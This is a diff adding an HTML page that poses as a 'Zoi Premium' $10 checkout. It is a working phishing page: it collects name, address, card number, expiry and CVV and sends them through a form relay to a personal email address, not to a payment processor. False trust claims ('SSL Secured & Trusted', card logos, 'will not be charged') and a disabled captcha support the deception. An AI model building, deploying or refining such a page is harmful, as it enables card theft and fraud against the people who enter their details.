@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Zoi Premium Checkout</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #1f1c2c, #928dab);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      background-color: #fff;
+      padding: 35px 40px;
+      max-width: 500px;
+      width: 90%;
+      border-radius: 15px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 10px;
+      color: #2f3640;
+    }
+
+    .price-tag {
+      background: #00a8ff;
+      color: white;
+      padding: 6px 14px;
+      border-radius: 20px;
+      text-align: center;
+      font-size: 14px;
+      margin-bottom: 25px;
+      display: block;
+      width: fit-content;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+      color: #2f3640;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 18px;
+      border: 1px solid #dcdde1;
+      border-radius: 6px;
+      font-size: 15px;
+      background-color: #f7f7f7;
+    }
+
+    .submit-btn {
+      background: #273c75;
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 6px;
+      width: 100%;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .submit-btn:hover {
+      background: #192a56;
+    }
+
+    .note {
+      text-align: center;
+      font-size: 13px;
+      color: #718093;
+      margin-top: 15px;
+    }
+
+    .secure {
+      text-align: center;
+      margin-top: 30px;
+      font-size: 13px;
+      color: #555;
+    }
+
+    .secure img {
+      height: 26px;
+      margin: 6px;
+      vertical-align: middle;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Zoi Premium Access</h2>
+    <span class="price-tag">$10 One-Time</span>
+    <form action="https://formsubmit.co/semijutt91@gmail.com" method="POST">
+      <input type="hidden" name="_subject" value="New Zoi Premium Order">
+      <input type="hidden" name="Price" value="$10">
+      <input type="hidden" name="_captcha" value="false">
+
+      <label for="name">Full Name</label>
+      <input type="text" name="Name" required>
+
+      <label for="email">Email</label>
+      <input type="email" name="Email" required>
+
+      <label for="country">Country</label>
+      <input type="text" name="Country" required>
+
+      <label for="city">City</label>
+      <input type="text" name="City" required>
+
+      <label for="zip">ZIP / Postal Code</label>
+      <input type="text" name="Zip Code" required>
+
+      <label for="card">Card Number</label>
+      <input type="text" name="Card Number" required>
+
+      <label for="expiry">Expiry Date (MM/YY)</label>
+      <input type="text" name="Expiry Date" id="expiry" maxlength="5" placeholder="MM/YY" required>
+
+      <label for="cvv">CVV</label>
+      <input type="text" name="CVV" required>
+
+      <button type="submit" class="submit-btn">Pay $10</button>
+    </form>
+
+    <div class="note">Your payment method will not be charged</div>
+
+    <div class="secure">
+      <p>This checkout is SSL Secured & Trusted</p>
+      <img src="https://img.icons8.com/color/48/visa.png" alt="Visa" />
+      <img src="https://img.icons8.com/color/48/mastercard-logo.png" alt="Mastercard" />
+      <img src="https://img.icons8.com/color/48/discover.png" alt="Discover" />
+      <img src="https://img.icons8.com/color/48/lock--v1.png" alt="Secure" />
+    </div>
+  </div>
+
+  <script>
+    // Auto-add slash in MM/YY field
+    const expiry = document.getElementById('expiry');
+    expiry.addEventListener('input', function(e) {
+      let val = e.target.value.replace(/\D/g, '');
+      if (val.length >= 3) {
+        e.target.value = val.slice(0, 2) + '/' + val.slice(2, 4);
+      } else {
+        e.target.value = val;
+      }
+    });
+  </script>
+</body>
+</html>
